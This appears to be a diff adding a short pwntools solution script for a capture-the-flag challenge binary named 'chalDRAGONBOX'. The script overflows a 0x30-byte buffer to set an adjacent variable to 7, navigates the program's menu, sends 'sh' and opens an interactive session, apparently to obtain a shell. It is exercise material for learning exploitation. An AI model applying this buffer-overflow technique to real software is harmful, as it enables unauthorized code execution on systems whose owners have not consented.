@@ -1,0 +1,13 @@
+from pwn import *
+
+# bof the buf char to overwrite the balls char to 7
+
+p = process("./chalDRAGONBOX")
+
+payload = b'A' * 0x30 + p8(0x7)
+p.sendlineafter(b">> ", b"3")
+p.sendafter(b"message: ", payload)
+p.sendlineafter(b">> ", b"2")
+p.sendlineafter(b"come true\n", b"sh")
+
+p.interactive()
